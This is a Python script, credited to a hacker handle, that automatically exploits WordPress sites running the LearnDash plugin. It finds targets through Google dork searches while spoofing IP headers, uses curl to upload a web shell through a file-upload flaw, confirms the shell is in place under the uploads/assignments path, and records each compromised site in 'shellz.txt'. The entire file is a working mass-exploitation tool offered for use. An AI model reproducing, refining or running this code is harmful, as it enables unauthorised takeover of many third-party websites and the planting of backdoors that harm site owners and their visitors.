#!/usr/bin/python
#Learndash mass exploiter via google dork
#coded by RSecxXx@Syndicate666Gh0sT
#Version 1.0.0
import urllib2,urllib,sys,re,random,string,time,threading,requests,os,colorama,termcolor,pyfiglet
try:
    dorklist=sys.argv[1]
except:
    print ("""\033[1;32;40m
                                                                                               
    _/      _/                                    _/_/_/                        _/              
   _/_/  _/_/    _/_/_/    _/_/_/    _/_/_/      _/    _/    _/_/    _/  _/_/  _/  _/          
  _/  _/  _/  _/    _/  _/_/      _/_/          _/    _/  _/    _/  _/_/      _/_/             
 _/      _/  _/    _/      _/_/      _/_/      _/    _/  _/    _/  _/        _/  _/            
_/      _/    _/_/_/  _/_/_/    _/_/_/        _/_/_/      _/_/    _/        _/    _/           
                                                                                               
Priv8 Tools Unlimineted Mass Dork Auto Exploiter..
CoD3d: RSecxXx@Syndicate666Gh0sT                                                                                              
""")
    print "Usage: "+sys.argv[0]+" [DORK LIST]" #Simple usage for the skids out ther ^_^
    exit(1)
def randomIP():
    return '.'.join('%s'%random.randint(0, 255) for i in range(4)) #Generate random IP for false headers
def exploit(url):
    scheme = url.split("/")[0]
    host = url.split("/")[2]
    print scheme + '//' + host + '/'
    os.popen('curl -F "post=foobar" -F "course_id=foobar" -F "uploadfile=foobar" -F "uploadfiles[]=@xmlrpc.php.php" ' + scheme + '//' + host + '/')
    try:
        if "UDP Flood" in urllib2.urlopen(scheme + '//' + host + '/wp-content/uploads/assignments/xmlrpc.php.').read():
            print "[+] Shell uploaded at " + scheme + '//' + host + '/wp-content/uploads/assignments/xmlrpc.php.'
            f=open("shellz.txt", "a")
            f.write(scheme + '//' + host + '/wp-content/uploads/assignments/xmlrpc.php.' + "\r\n")
            f.close()
    except Exception as e:
        print "[-] Failed! " + str(e)
        pass
def spyder(dork,page):
    opener = urllib2.build_opener()
    opener.addheaders = [('User-agent','Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11')] #Custom user agent.
    opener.addheaders = [('CLIENT-IP',randomIP())] #Inject random IP header into multiple variables, to remain anonymous.
    opener.addheaders = [('REMOTE-ADDR',randomIP())]
    opener.addheaders = [('VIA',randomIP())]
    opener.addheaders = [('X-FORWARDED-FOR',randomIP())]
    opener.addheaders = [('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]
    opener.addheaders = [('Accept-Language','en-US,en;q=0.5')]
    opener.addheaders = [('Accept-Encoding','gzip, deflate')]
    opener.addheaders = [('Referer',dork)]
    try:
        searchresults=opener.open(dork,timeout=5).read()
    except Exception, e:
        print "[-] "+str(e)
        print "[-] Bot has been blocked from google!!! Change VPN server or proxy! Press enter to continue"
        raw_input()
        spyder(dork, page)
    try:
        searchresults
    except NameError:
#       print "[-] Variable undefined, re-searching"
        try:
            searchresults=opener.open(dork,timeout=5).read()
        except:
            try:
                searchresults=opener.open(dork,timeout=5).read()
            except:
                print "[-] Bot has been blocked from google!!! Change VPN server or proxy! Press enter to continue"
                raw_input()
                spyder(dork, page)
    else:
        pass
#       print "[+] Variable defined, continuing search"

    for i in re.findall('''href=["'](.[^"']+)["']''',searchresults, re.I):
        i=i.replace("amp;",'')
        if i.endswith("start="+str(page)+"0&sa=N") and i.startswith("/search"):
            dorkurl="https://encrypted.google.com"+i
            print "[+] Searching next page "+dorkurl
            time.sleep(5)
            spyder(dorkurl,page)
            page+=1
        i=urllib2.unquote(i).decode('utf8')
        try:
            i=i.split("?q=")[1]
            i=i.split("&sa=")[0]
            if i.startswith("http"):
                    if i.startswith("http://accounts.google.com"):
                        continue
                    elif i.startswith("http://www.google.com"):
                        continue
                    elif i.startswith("http://encrypted.google.com"):
                        continue
                    elif i.startswith("http://webcache.googleusercontent.com"):
                        continue
                    elif i!=dork.decode('utf8'):
                        threading.Thread(target=exploit, args=(i,)).start()
        except:
            continue
f=open(dorklist,"r")
for dork in f.read().split("\n"):
    print "[+] Searching for dork: '"+dork+"'"
    spyder('https://encrypted.google.com/search?hl=en&q='+urllib.quote_plus(dork),1)
f.close()